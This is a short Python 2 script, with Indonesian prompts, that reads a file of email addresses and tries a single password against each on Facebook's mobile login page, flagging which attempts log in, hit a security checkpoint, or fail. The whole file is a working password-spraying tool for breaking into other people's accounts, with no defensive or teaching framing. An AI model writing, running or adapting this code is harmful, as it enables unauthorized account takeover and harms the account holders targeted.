from requests import Session

def kimbek():
	a=input("--DAFTAR PENDOSA--# ")
	pas=input("--MASUKAN UMPATAN--# ")
	b=open(a).read()
	for email in b.splitlines():
		r = Session()
		data = {
		"email":email,
		"pass":pas,

		}
		url = ("https://mbasic.facebook.com/login")
		p = r.post(url, data=data)
		if "save-device" in p.url:
			print "\33[32;1m{ ntap } ",email," #~# ",pas
		elif "checkpoint" in p.url:
			print "\33[1;33m{ haram } ",email," #~# ",pas
		else:
			print "\33[31;1m{ BABI } ",email," #~# ",pas


kimbek()